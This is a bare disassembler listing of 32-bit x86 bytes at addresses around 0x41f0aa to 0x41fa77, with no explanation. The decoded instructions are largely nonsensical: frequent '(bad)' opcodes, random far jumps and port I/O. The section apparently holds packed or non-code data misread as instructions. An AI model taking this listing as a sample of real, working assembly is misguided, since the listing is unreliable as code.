  41f0aa:	xchg   DWORD PTR ds:0x87179ce7,ebp
  41f0b0:	outs   dx,BYTE PTR ds:[esi]
  41f0b1:	sub    edi,esp
  41f0b3:	push   ecx
  41f0b4:	icebp  
  41f0b5:	xlat   BYTE PTR ds:[ebx]
  41f0b6:	dec    ebx
  41f0b7:	scas   al,BYTE PTR es:[edi]
  41f0b8:	pop    esp
  41f0b9:	push   edi
  41f0ba:	xchg   bl,al
  41f0bc:	jge    0x41f053
  41f0be:	sub    ecx,eax
  41f0c0:	test   BYTE PTR [ecx],bl
  41f0c2:	cmp    BYTE PTR [eax+0x62],0xa8
  41f0c6:	clc    
  41f0c7:	shl    BYTE PTR [ecx+0x18a6f235],1
  41f0cd:	pop    ebx
  41f0ce:	mov    eax,ds:0x50b7c756
  41f0d3:	les    ecx,FWORD PTR [esi+ecx*2-0x12]
  41f0d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0d8:	int3   
  41f0d9:	aam    0x58
  41f0db:	loop   0x41f11d
  41f0dd:	push   cs
  41f0de:	or     edx,DWORD PTR [edx]
  41f0e0:	pop    ebp
  41f0e1:	mov    ds:0xabad19f2,al
  41f0e6:	sbb    ebp,DWORD PTR [edi-0x1538fc9c]
  41f0ec:	or     al,0x3b
  41f0ee:	cmc    
  41f0ef:	sbb    DWORD PTR [edx+edi*1-0x1f],ebp
  41f0f3:	ja     0x41f0d5
  41f0f5:	in     eax,0xfc
  41f0f7:	pusha  
  41f0f8:	ror    ah,0xa6
  41f0fb:	push   0xffffff80
  41f0fd:	xchg   ebx,eax
  41f0fe:	push   0x4e0894e0
  41f103:	jle    0x41f137
  41f105:	mov    ecx,0x888ce493
  41f10a:	clc    
  41f10b:	imul   ecx,DWORD PTR [eax+esi*1+0x188607],0x0
	...
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4b2f:0x4265f435
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    eax,0xf8000001
  41f18d:	mov    edx,0x35a165f
  41f192:	xchg   edi,eax
  41f193:	xlat   BYTE PTR ds:[ebx]
  41f194:	ins    DWORD PTR es:[edi],dx
  41f195:	jno    0x41f173
  41f197:	popf   
  41f198:	loop   0x41f1ba
  41f19a:	cmp    dl,BYTE PTR [eax-0x49b4000f]
  41f1a0:	pop    edi
  41f1a1:	xchg   ebp,eax
  41f1a2:	cdq    
  41f1a3:	fnstenv ds:0xc655649d
  41f1a9:	sahf   
  41f1aa:	pmulhuw mm0,QWORD PTR [ebx-0x4268b658]
  41f1b1:	lea    eax,[eax+0x26703ec1]
  41f1b7:	in     eax,0x90
  41f1b9:	(bad)
  41f1be:	jg     0x41f22b
  41f1c0:	jo     0x41f1df
  41f1c2:	or     BYTE PTR [ebp+0x5f4b43fa],dl
  41f1c8:	dec    eax
  41f1c9:	ins    BYTE PTR es:[edi],dx
  41f1ca:	es cld 
  41f1cc:	xchg   esi,eax
  41f1cd:	(bad)  
  41f1ce:	mov    al,0x78
  41f1d0:	inc    esi
  41f1d1:	daa    
  41f1d2:	sar    edx,1
  41f1d4:	mov    al,ds:0x50b2e6dc
  41f1d9:	imul   ebp,DWORD PTR [edx+edi*1+0x50],0xc69b5aba
  41f1e1:	pop    ebp
  41f1e2:	push   edx
  41f1e3:	mov    al,0x19
  41f1e5:	cmp    esp,DWORD PTR [ebp+0x385b0053]
  41f1eb:	(bad)  
  41f1ec:	cmp    eax,0x437a1468
  41f1f1:	test   BYTE PTR [eax],dl
  41f1f3:	outs   dx,BYTE PTR ds:[esi]
  41f1f4:	xchg   edi,eax
  41f1f5:	fisttp WORD PTR [ebx+0x63]
  41f1f8:	shr    BYTE PTR [esi],1
  41f1fa:	inc    esp
  41f1fb:	xchg   edi,eax
  41f1fc:	xchg   ebp,eax
  41f1fd:	mov    al,ds:0x574e8fa2
  41f202:	and    DWORD PTR [ebx],esp
  41f204:	add    eax,0xfb1fbc6e
  41f209:	(bad)  [ecx-0x74]
  41f20c:	jle    0x41f19a
  41f20e:	sub    al,0x79
  41f210:	js     0x41f1c1
  41f212:	sub    al,0x76
  41f214:	xor    al,0x8f
  41f216:	mov    al,ds:0xaea4c1a5
  41f21b:	pop    edx
  41f21c:	std    
  41f21d:	add    al,0xc4
  41f21f:	sub    BYTE PTR [ebx+0x1e0f146f],dh
  41f225:	pop    ss
  41f226:	rcl    DWORD PTR [eax+0x7f],1
  41f229:	adc    al,0x47
  41f22b:	popa   
  41f22c:	loop   0x41f2a1
  41f22e:	mov    esp,0x78963e1c
  41f233:	cwde   
  41f234:	sbb    eax,0x51db6ac7
  41f239:	lds    ebx,FWORD PTR [esi-0x5dea3934]
  41f23f:	cdq    
  41f240:	scas   eax,DWORD PTR es:[edi]
  41f241:	sbb    esi,ebp
  41f243:	into   
  41f244:	xor    BYTE PTR [esi-0x20],al
  41f247:	adc    DWORD PTR [ebx-0x180e9208],esi
  41f24d:	std    
  41f24e:	out    dx,eax
  41f24f:	ds stos BYTE PTR es:[edi],al
  41f251:	dec    esi
  41f252:	or     BYTE PTR [edi],bh
  41f254:	inc    edi
  41f255:	pop    ebx
  41f256:	popf   
  41f257:	cdq    
  41f258:	sbb    eax,0xef468d5
  41f25d:	pushf  
  41f25e:	dec    edx
  41f25f:	or     ch,BYTE PTR [edx-0x1a]
  41f262:	pop    ebp
  41f263:	xor    BYTE PTR [esi-0x7b],dl
  41f266:	test   eax,0xe79c58f3
  41f26b:	push   0x23a78e84
  41f270:	leave  
  41f271:	or     BYTE PTR [edx-0x3c],al
  41f274:	push   0xffffffab
  41f276:	jno    0x41f2c6
  41f278:	pop    ds
  41f279:	mov    ebp,0xdc31be0
  41f27e:	xchg   edi,eax
  41f27f:	out    0xf9,al
  41f281:	scas   al,BYTE PTR es:[edi]
  41f282:	sar    DWORD PTR [edi+0xe5b943],0xdd
  41f289:	xchg   BYTE PTR [edi-0x7cc5fa3],bh
  41f28f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f290:	cdq    
	...
  41f2f1:	add    BYTE PTR [eax],al
  41f2f3:	add    BYTE PTR [ecx+0x1b],dl
  41f2f6:	jmp    DWORD PTR [esi-0x1]
  41f2f9:	out    0xd9,al
  41f2fb:	aas    
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f2db
  41f301:	pop    edx
  41f302:	stc    
  41f303:	mov    al,0x34
  41f305:	dec    esp
  41f306:	add    DWORD PTR [eax],eax
  41f308:	add    eax,0x2c000001
  41f30d:	xchg   BYTE PTR [edx],al
  41f30f:	das    
  41f310:	ins    BYTE PTR es:[edi],dx
  41f311:	xchg   DWORD PTR [ecx-0x5fffcbf4],ebx
  41f317:	dec    ecx
  41f318:	sub    ch,bh
  41f31a:	clc    
  41f31b:	imul   edx,DWORD PTR [ecx-0x37],0xb311cd34
  41f322:	jge    0x41f32d
  41f324:	dec    esp
  41f325:	loope  0x41f35e
  41f327:	ror    ebp,1
  41f329:	push   ds
  41f32a:	shr    BYTE PTR [ecx],0x2e
  41f32d:	or     ebx,DWORD PTR [esi]
  41f32f:	pop    edi
  41f330:	pop    ebx
  41f331:	push   esp
  41f332:	pop    eax
  41f333:	into   
  41f334:	arpl   di,sp
  41f336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f337:	adc    DWORD PTR [edi],esp
  41f339:	(bad)  
  41f33a:	std    
  41f33b:	js     0x41f32c
  41f33d:	cmc    
  41f33e:	rcr    DWORD PTR [eax-0x21],1
  41f341:	mov    ecx,0x3d306467
  41f346:	out    dx,eax
  41f347:	inc    edi
  41f348:	dec    esi
  41f349:	je     0x41f33d
  41f34b:	sub    esi,esp
  41f34d:	add    DWORD PTR [ecx],esi
  41f34f:	jle    0x41f2dc
  41f351:	jns    0x41f36d
  41f353:	in     eax,0xf5
  41f355:	xlat   BYTE PTR ds:[ebx]
  41f356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f357:	(bad)  
  41f358:	push   esp
  41f359:	jno    0x41f33e
  41f35b:	pop    es
  41f35c:	inc    edi
  41f35d:	sahf   
  41f35e:	ret    0xfb32
  41f361:	out    dx,al
  41f362:	hlt    
  41f363:	stos   BYTE PTR es:[edi],al
  41f364:	jge    0x41f3d1
  41f366:	mov    esp,DWORD PTR [ebx+ebp*8-0x43]
  41f36a:	or     DWORD PTR [ebx-0x67],edi
  41f36d:	popf   
  41f36e:	iret   
  41f36f:	jns    0x41f3c8
  41f371:	lahf   
  41f372:	test   ax,0xf36
  41f376:	in     al,dx
  41f377:	sbb    cl,BYTE PTR [ecx+esi*4-0x24269807]
  41f37e:	mov    DWORD PTR [ecx],ecx
  41f380:	pop    edx
  41f381:	or     DWORD PTR [ebp-0x67],edx
  41f384:	retf   
  41f385:	mov    al,0xac
  41f387:	inc    edi
  41f388:	add    ebp,ebx
  41f38a:	xchg   esi,eax
  41f38b:	cmp    ah,dl
  41f38d:	icebp  
  41f38e:	dec    ebx
  41f38f:	sub    ch,BYTE PTR [ebp-0x56945ba5]
  41f395:	sub    eax,DWORD PTR ds:0xfa95602c
  41f39b:	adc    BYTE PTR [ebx-0x80],0x60
  41f39f:	mov    ecx,0x5c72b6e4
  41f3a4:	ror    DWORD PTR [edx+0x2f4b13d7],cl
  41f3aa:	test   eax,0x1a313ff
  41f3af:	add    DWORD PTR [esp+eax*4+0x1259e30c],ebp
  41f3b6:	dec    esp
  41f3b7:	dec    ebp
  41f3b8:	and    ah,BYTE PTR [ecx+0x5a2f594f]
  41f3be:	mov    ebx,0x25236094
  41f3c3:	inc    eax
  41f3c4:	(bad)  
  41f3c6:	sbb    BYTE PTR [ebp+esi*8+0x2d],dl
  41f3ca:	push   esi
  41f3cb:	inc    esp
  41f3cc:	push   es
  41f3cd:	inc    ebx
  41f3ce:	mov    ebx,0x5f576b2c
  41f3d3:	mov    bh,ah
  41f3d5:	adc    ebx,DWORD PTR [eax-0x310045ae]
  41f3db:	shl    BYTE PTR [ebx-0x59],1
  41f3de:	(bad)  
  41f3df:	adc    al,0x88
  41f3e1:	xor    al,0x5c
  41f3e3:	xchg   esp,eax
  41f3e4:	adc    al,ch
  41f3e6:	sub    edi,ebp
  41f3e8:	lahf   
  41f3e9:	loop   0x41f3dd
  41f3eb:	mov    ds:0xc0e51d24,al
  41f3f0:	or     BYTE PTR [esi-0x3e],cl
  41f3f3:	sub    edx,DWORD PTR [ecx]
  41f3f5:	push   ebp
  41f3f6:	mov    cl,0x24
  41f3f8:	repz sbb al,0x45
  41f3fb:	inc    ecx
  41f3fc:	push   cs
  41f3fd:	push   edx
  41f3fe:	inc    ecx
  41f3ff:	dec    ebp
  41f400:	add    cl,bh
  41f402:	rol    DWORD PTR [ebp-0x6c],0x9e
  41f406:	jmp    0xb07b:0xfa7b5963
  41f40d:	xchg   esp,eax
  41f40e:	mov    BYTE PTR [edi+ebp*4+0x0],ch
	...
  41f472:	add    BYTE PTR [eax],al
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0xc2
  41f481:	sub    BYTE PTR [ecx-0x16],dl
  41f484:	cmp    DWORD PTR [ebp+0x1],ecx
  41f487:	add    BYTE PTR ds:0x20000001,al
  41f48d:	dec    edi
  41f48e:	sub    ebx,DWORD PTR [eax+0x1e]
  41f491:	xchg   ebx,eax
  41f492:	mov    esi,0x48f942db
  41f497:	dec    edx
  41f498:	mov    BYTE PTR [ebx],dh
  41f49a:	xlat   BYTE PTR ds:[ebx]
  41f49b:	push   ss
  41f49c:	pop    esp
  41f49d:	push   esp
  41f49e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f49f:	jmp    0xfa92:0x896710e0
  41f4a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4a7:	pop    ecx
  41f4a8:	rcr    BYTE PTR [ebp+0x71a38d87],0xce
  41f4af:	int3   
  41f4b0:	loop   0x41f48a
  41f4b2:	stos   BYTE PTR es:[edi],al
  41f4b3:	xchg   ebp,eax
  41f4b4:	test   BYTE PTR [esi+eiz*4+0x55],0x2f
  41f4b9:	ins    DWORD PTR es:[edi],dx
  41f4ba:	les    esp,FWORD PTR [edi+ebp*8]
  41f4bd:	outs   dx,DWORD PTR ds:[esi]
  41f4be:	sbb    al,0x96
  41f4c0:	sti    
  41f4c1:	(bad)  
  41f4c3:	xchg   ebx,eax
  41f4c4:	adc    BYTE PTR [ebx+0x3c6140bc],bl
  41f4ca:	out    0x47,al
  41f4cc:	in     al,dx
  41f4cd:	sbb    eax,0x59013024
  41f4d2:	mov    WORD PTR [eax+0x63d981d3],?
  41f4d8:	push   ss
  41f4d9:	(bad)  
  41f4da:	stc    
  41f4db:	out    0x5c,al
  41f4dd:	cmp    BYTE PTR [edx-0x1177be7b],ch
  41f4e3:	add    al,0xa4
  41f4e5:	mov    ds:0xcb3c0c30,eax
  41f4ea:	ins    BYTE PTR es:[edi],dx
  41f4eb:	sub    bh,BYTE PTR [edi]
  41f4ed:	adc    al,bh
  41f4ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4f0:	shl    BYTE PTR [ebx+0x4e],1
  41f4f3:	mov    ebp,0x52fc4c90
  41f4f8:	shl    DWORD PTR [ecx+0x70],cl
  41f4fb:	pop    edx
  41f4fc:	inc    DWORD PTR [ebp+0x5598c8aa]
  41f502:	dec    esi
  41f503:	cdq    
  41f504:	int3   
  41f505:	out    dx,eax
  41f506:	sub    DWORD PTR [edi+0x6a],ebp
  41f509:	inc    edx
  41f50a:	or     BYTE PTR [esi],ah
  41f50c:	and    DWORD PTR [ebx+0x6785f29],eax
  41f512:	mov    eax,0x36c31854
  41f517:	and    al,0xa9
  41f519:	inc    esp
  41f51a:	pop    es
  41f51b:	js     0x41f553
  41f51d:	xor    al,0xf7
  41f51f:	lahf   
  41f520:	gs xor eax,0x17df5b1d
  41f526:	jb     0x41f559
  41f528:	je     0x41f570
  41f52a:	outs   dx,BYTE PTR ds:[esi]
  41f52b:	push   es
  41f52c:	addr16 (bad) 
  41f52e:	pop    ds
  41f52f:	cmp    eax,0x144bf4d8
  41f534:	lea    eax,[edx+0x2d2ebfa4]
  41f53a:	adc    al,bh
  41f53c:	push   ebp
  41f53d:	clc    
  41f53e:	imul   esp,DWORD PTR [esi-0x6906b5ad],0xfcb33391
  41f548:	cwde   
  41f549:	sub    ecx,DWORD PTR [esi-0x79]
  41f54c:	loopne 0x41f583
  41f54e:	mul    BYTE PTR [edi+0x79]
  41f551:	into   
  41f552:	adc    BYTE PTR [esi+eiz*2-0x64f6004c],dl
  41f559:	into   
  41f55a:	add    eax,0xa6f27e47
  41f55f:	mov    ecx,0x949d65fc
  41f564:	and    eax,0x2de0dd76
  41f569:	aaa    
  41f56a:	sub    DWORD PTR [edx-0x74],edx
  41f56d:	iret   
  41f56e:	push   edx
  41f56f:	dec    esi
  41f570:	in     eax,0x72
  41f572:	pop    esi
  41f573:	mov    gs,WORD PTR [edi+0xa]
  41f576:	out    0xd2,eax
  41f578:	call   0xb213:0x9a83f45d
  41f57f:	shl    BYTE PTR [eax-0x44d7f180],cl
  41f585:	adc    ch,BYTE PTR [ecx]
  41f587:	adc    ebx,0xffffff84
  41f58a:	int3   
  41f58b:	jle    0x41f556
  41f58d:	gs add eax,0x50bf
	...
  41f5f3:	add    BYTE PTR [eax+0x34],bh
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x86fd:0x382ad422
  41f604:	ds dec esi
  41f606:	add    DWORD PTR [eax],eax
  41f608:	add    eax,0x7b000001
  41f60d:	and    ch,bh
  41f60f:	addr16 (bad) 
  41f611:	div    DWORD PTR [edi]
  41f613:	outs   dx,DWORD PTR ds:[esi]
  41f614:	imul   ebp,esp,0xffffffa1
  41f617:	mov    ecx,0x47fe6f31
  41f61c:	outs   dx,BYTE PTR ds:[esi]
  41f61d:	pop    esi
  41f61e:	retf   0x9087
  41f621:	pop    esi
  41f622:	gs pop ds
  41f624:	jnp    0x41f610
  41f626:	loop   0x41f60d
  41f628:	push   ebx
  41f629:	cmp    dl,BYTE PTR [eax+esi*1+0x69]
  41f62d:	and    eax,0x70b41377
  41f632:	push   ds
  41f633:	inc    edi
  41f634:	xchg   BYTE PTR [eax-0x2c],al
  41f637:	mov    ds:0x5d6e34e7,eax
  41f63c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f63d:	(bad)  [ebp-0x529ded40]
  41f643:	inc    edi
  41f644:	icebp  
  41f645:	push   0xffffffb2
  41f647:	lds    esp,FWORD PTR [edx+0x328b1e17]
  41f64d:	dec    ebp
  41f64e:	outs   dx,DWORD PTR ds:[esi]
  41f64f:	dec    ebp
  41f650:	xchg   edi,eax
  41f651:	fadd   DWORD PTR [ebx+0x74fe24a5]
  41f657:	jmp    0x41f6ca
  41f659:	inc    ecx
  41f65a:	stos   DWORD PTR es:[edi],eax
  41f65b:	icebp  
  41f65c:	mov    DWORD PTR [edx+eiz*8-0x58a6c48c],edx
  41f663:	out    dx,al
  41f664:	xor    cl,BYTE PTR [esi]
  41f666:	popa   
  41f667:	xor    DWORD PTR [ebp+eiz*1+0x2a],ebx
  41f66b:	push   edx
  41f66c:	test   DWORD PTR [esi-0x70],ebx
  41f66f:	daa    
  41f670:	enter  0x5dd1,0x7
  41f674:	ins    DWORD PTR es:[edi],dx
  41f675:	cmp    eax,0x170ec344
  41f67a:	and    al,0x5a
  41f67c:	pop    ecx
  41f67d:	push   ebp
  41f67e:	call   0x558073d7
  41f683:	aas    
  41f684:	int    0x65
  41f686:	push   ebx
  41f687:	mov    edx,ds
  41f689:	retf   0x2354
  41f68c:	pop    esi
  41f68d:	shr    ebx,1
  41f68f:	out    dx,al
  41f690:	push   esp
  41f691:	imul   esp,DWORD PTR [ecx+0x55],0x5b
  41f695:	cwde   
  41f696:	fcomp  QWORD PTR [esi-0x41]
  41f699:	neg    dl
  41f69b:	xchg   edx,esi
  41f69d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f69e:	into   
  41f69f:	addr16 adc eax,0x7efa02c0
  41f6a5:	adc    ecx,edi
  41f6a7:	imul   edx,DWORD PTR [edx+edx*8-0x5d28d7b3],0xffffffb0
  41f6af:	xchg   ecx,eax
  41f6b0:	lods   eax,DWORD PTR ds:[esi]
  41f6b1:	pusha  
  41f6b2:	xchg   DWORD PTR [ecx-0x1380661],edx
  41f6b8:	jecxz  0x41f71e
  41f6ba:	cdq    
  41f6bb:	inc    eax
  41f6bc:	ficom  DWORD PTR [ebx]
  41f6be:	cli    
  41f6bf:	loop   0x41f6d4
  41f6c1:	push   edx
  41f6c2:	cwde   
  41f6c3:	jnp    0x41f6f9
  41f6c5:	push   edx
  41f6c6:	arpl   bp,cx
  41f6c8:	cmp    cl,BYTE PTR ds:0x17d0a61f
  41f6ce:	retf   0xd350
  41f6d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6d2:	popf   
  41f6d3:	shl    DWORD PTR [edi],0x5c
  41f6d6:	mov    ch,0x11
  41f6d8:	addr16 mov bl,0x15
  41f6db:	push   cs
  41f6dc:	shl    BYTE PTR [ebx],cl
  41f6de:	mov    DWORD PTR [edi-0x6f4fac86],edx
  41f6e4:	dec    esp
  41f6e5:	and    al,0xd0
  41f6e7:	add    ah,BYTE PTR [esi+0x5e937db1]
  41f6ed:	mov    ds:0x91b4600f,eax
  41f6f2:	or     al,0xa4
  41f6f4:	sbb    BYTE PTR [ecx],cl
  41f6f6:	dec    edi
  41f6f7:	data16 lods al,BYTE PTR ds:[esi]
  41f6f9:	jge    0x41f6cb
  41f6fb:	ret    0xdefb
  41f6fe:	call   0x80e02f9f
  41f703:	push   cs
  41f704:	fstp   DWORD PTR [ebx]
  41f706:	adc    esi,ebp
  41f708:	clc    
  41f709:	icebp  
  41f70a:	loopne 0x41f6c3
  41f70c:	xchg   ebx,eax
  41f70d:	in     eax,0xd4
  41f70f:	pop    ds
  41f710:	popf   
	...
  41f771:	add    BYTE PTR [eax],al
  41f773:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0x3cf0:0xad6c62d2
  41f783:	xchg   BYTE PTR [ebx+0x4f],al
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    eax,0xba000001
  41f78d:	sub    ah,dh
  41f78f:	stos   DWORD PTR es:[edi],eax
  41f790:	jbe    0x41f75b
  41f792:	in     eax,0xf7
  41f794:	popf   
  41f795:	inc    edx
  41f796:	dec    ebx
  41f797:	xchg   esi,eax
  41f798:	xchg   esp,eax
  41f799:	mov    ds:0x5e55dd94,eax
  41f79e:	jns    0x41f80a
  41f7a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7a1:	retf   0xf7c7
  41f7a4:	mov    ecx,0x2c2869a7
  41f7a9:	(bad)
  41f7ae:	push   edi
  41f7af:	push   esi
  41f7b0:	adc    BYTE PTR [esi],cl
  41f7b2:	es adc al,0xb
  41f7b5:	pop    es
  41f7b6:	xchg   al,cl
  41f7b8:	mov    bl,0xb
  41f7ba:	je     0x41f7f0
  41f7bc:	add    ebp,DWORD PTR [edi]
  41f7be:	das    
  41f7bf:	cmp    DWORD PTR [ecx+0x22a7744a],eax
  41f7c5:	pop    edi
  41f7c6:	mov    cl,0x4b
  41f7c8:	and    al,0xf
  41f7ca:	push   esp
  41f7cb:	rcl    BYTE PTR [esi],1
  41f7cd:	pop    esp
  41f7ce:	push   edx
  41f7cf:	in     al,0x9c
  41f7d1:	fstp   QWORD PTR [edi+0x31933802]
  41f7d7:	daa    
  41f7d8:	out    0xf5,al
  41f7da:	dec    eax
  41f7db:	sub    bh,BYTE PTR [esi-0x42]
  41f7de:	mov    bh,0xb9
  41f7e0:	and    bh,BYTE PTR [edx+0x2fcbfcf1]
  41f7e6:	sbb    eax,0x83cbaa61
  41f7eb:	or     al,0x57
  41f7ed:	pop    ebp
  41f7ee:	popf   
  41f7ef:	xchg   ecx,eax
  41f7f0:	mov    ds:0x16b86b96,al
  41f7f5:	xor    DWORD PTR [ecx-0x26d37ca1],ebp
  41f7fb:	push   edi
  41f7fc:	out    dx,al
  41f7fd:	or     eax,0xcf707cf2
  41f803:	push   cs
  41f804:	pop    ds
  41f805:	sub    ebp,ebp
  41f807:	ror    dh,cl
  41f809:	push   ebp
  41f80a:	push   ss
  41f80b:	push   ss
  41f80c:	or     al,0xd4
  41f80e:	dec    esp
  41f80f:	xchg   esp,eax
  41f810:	mov    ecx,0x4029875b
  41f815:	dec    ebx
  41f816:	pop    esi
  41f817:	and    BYTE PTR [ecx+0x2c733870],bh
  41f81d:	pop    ebx
  41f81e:	dec    ebp
  41f81f:	mov    edi,eax
  41f821:	xchg   esi,eax
  41f822:	jmp    0x864:0xc5c59884
  41f829:	xchg   ebp,eax
  41f82a:	xchg   esi,eax
  41f82b:	pop    ss
  41f82c:	lahf   
  41f82d:	js     0x41f7ea
  41f82f:	aam    0x14
  41f831:	push   0x7
  41f833:	test   eax,esi
  41f835:	dec    BYTE PTR [ecx+0x48f28f46]
  41f83b:	push   ecx
  41f83c:	xchg   ecx,eax
  41f83d:	retf   
  41f83e:	jl     0x41f800
  41f840:	pop    es
  41f841:	xor    ah,BYTE PTR [ecx-0x69]
  41f844:	(bad)  
  41f845:	in     al,dx
  41f846:	sub    eax,0xb5b125f6
  41f84b:	add    BYTE PTR [eax+0x7],bh
  41f84e:	push   eax
  41f84f:	or     DWORD PTR [ebx],esp
  41f851:	mov    cl,0x1b
  41f853:	adc    DWORD PTR [edi-0x33c63535],0x62
  41f85a:	ret    0xd0b9
  41f85d:	sub    DWORD PTR [ebx+0x72581b14],esp
  41f863:	xor    al,0xa6
  41f865:	push   edx
  41f866:	adc    al,0x62
  41f868:	add    esp,DWORD PTR [ebx]
  41f86a:	push   eax
  41f86b:	dec    edi
  41f86c:	sbb    DWORD PTR [eax-0x3f1a14c5],ebp
  41f872:	cli    
  41f873:	gs aaa 
  41f875:	imul   ecx,DWORD PTR [esi-0x16a75db8],0x20
  41f87c:	loope  0x41f827
  41f87e:	and    ebx,eax
  41f880:	cmp    BYTE PTR [eax+edx*1-0x69786ea4],bl
  41f887:	adc    BYTE PTR [edx],bh
  41f889:	pop    ecx
  41f88a:	sub    DWORD PTR [edi+0x41c43878],edi
  41f890:	xor    BYTE PTR [eax],al
	...
  41f8f2:	add    BYTE PTR [eax],al
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	add    al,0xa8
  41f903:	jne    0x41f94d
  41f905:	push   eax
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    eax,0x8d000001
  41f90d:	loop   0x41f8b6
  41f90f:	icebp  
  41f910:	xor    eax,0xfc68a25e
  41f915:	jmp    FWORD PTR ds:0x4ca87c3a
  41f91c:	cmc    
  41f91d:	xchg   DWORD PTR [ebp+0x5],esi
  41f920:	ja     0x41f8de
  41f922:	repz sbb al,BYTE PTR [ebx]
  41f925:	in     al,0x8a
  41f927:	xor    al,0xe7
  41f929:	in     al,0xef
  41f92b:	lock test eax,0x6b621c98
  41f931:	xchg   edx,eax
  41f932:	inc    ebx
  41f933:	jp     0x41f8bb
  41f935:	pop    esi
  41f936:	xchg   edi,eax
  41f937:	adc    eax,DWORD PTR [edi]
  41f939:	aas    
  41f93a:	aad    0xa8
  41f93c:	sahf   
  41f93d:	inc    ebp
  41f93e:	jecxz  0x41f95a
  41f940:	lods   al,BYTE PTR ds:[esi]
  41f941:	cmp    dh,al
  41f943:	dec    ebp
  41f944:	xor    BYTE PTR [ecx+0x46],bl
  41f947:	inc    BYTE PTR [eax+ebp*1-0x7c]
  41f94b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f94c:	(bad)  
  41f94d:	aas    
  41f94e:	mov    dl,0xe0
  41f950:	dec    esi
  41f951:	inc    eax
  41f952:	imul   edi,DWORD PTR [esi-0x38500f10],0xd
  41f959:	call   0xe4c35647
  41f95e:	add    DWORD PTR [esi],ebx
  41f960:	pop    ecx
  41f961:	or     dl,0x96
  41f964:	push   0xfffffff2
  41f966:	outs   dx,DWORD PTR ds:[esi]
  41f967:	shr    BYTE PTR [edx-0x4b],0x96
  41f96b:	mov    BYTE PTR [esi+eax*1],bl
  41f96e:	(bad)  
  41f96f:	stos   DWORD PTR es:[edi],eax
  41f970:	jns    0x41f9a5
  41f972:	in     eax,0xd3
  41f974:	aas    
  41f975:	add    bl,BYTE PTR [esp+ebx*1+0x58]
  41f979:	mov    esi,0x684dca78
  41f97e:	rcl    BYTE PTR [edx-0x2a],cl
  41f981:	adc    eax,0x307aed9d
  41f986:	loopne 0x41f973
  41f988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f989:	sub    ah,BYTE PTR [edx+0x4ba6747d]
  41f98f:	imul   edi,DWORD PTR [edx+0x53],0xe49732e4
  41f996:	sahf   
  41f997:	test   al,0xe9
  41f999:	add    al,0x6b
  41f99b:	pop    edx
  41f99c:	sbb    edi,0x39
  41f99f:	xchg   edi,eax
  41f9a0:	je     0x41f984
  41f9a2:	inc    ecx
  41f9a3:	dec    ebx
  41f9a4:	or     ecx,eax
  41f9a6:	push   ebp
  41f9a7:	fsub   QWORD PTR [edx+edx*2-0x44aa458b]
  41f9ae:	pop    edi
  41f9af:	out    0x34,eax
  41f9b1:	xlat   BYTE PTR ds:[ebx]
  41f9b2:	int3   
  41f9b3:	dec    ebx
  41f9b4:	mov    edi,0x2a7d10e5
  41f9b9:	loopne 0x41fa0e
  41f9bb:	inc    ecx
  41f9bc:	xchg   DWORD PTR [edi],eax
  41f9be:	clc    
  41f9bf:	jmp    0xcd5976e7
  41f9c4:	sub    BYTE PTR [edi+0x34dc4b41],bh
  41f9ca:	mov    ebp,0x77a56a64
  41f9cf:	scas   al,BYTE PTR es:[edi]
  41f9d0:	mov    ebp,0x573b0bdb
  41f9d5:	rol    BYTE PTR [edi],cl
  41f9d7:	cli    
  41f9d8:	jns    0x41f98c
  41f9da:	mov    dl,0xdc
  41f9dc:	pusha  
  41f9dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9de:	repnz add cl,BYTE PTR [ecx]
  41f9e1:	lahf   
  41f9e2:	mov    dh,dl
  41f9e4:	test   BYTE PTR [eax],cl
  41f9e6:	pop    ebp
  41f9e7:	sbb    eax,0x2578e301
  41f9ec:	cmp    eax,0xef8ca73c
  41f9f1:	leave  
  41f9f2:	(bad)  
  41f9f3:	adc    BYTE PTR [edx],bh
  41f9f5:	sbb    al,BYTE PTR [eax-0x384cbe4a]
  41f9fb:	xchg   edx,eax
  41f9fc:	inc    ebp
  41f9fd:	inc    ebp
  41f9fe:	(bad)  
  41f9ff:	pop    ecx
  41fa00:	adc    dh,BYTE PTR [eax+0x9]
  41fa03:	mov    dl,0xf5
  41fa05:	sbb    al,BYTE PTR [ebx+0x35dad583]
  41fa0b:	inc    ebp
  41fa0c:	ret    
  41fa0d:	inc    eax
  41fa0e:	xlat   BYTE PTR ds:[ebx]
  41fa0f:	repnz add al,BYTE PTR [eax]
	...
  41fa72:	add    BYTE PTR [eax],al
  41fa74:	or     al,BYTE PTR [ecx-0x49]
  41fa77:	mov    eax,ds:0xeb1ef7ff
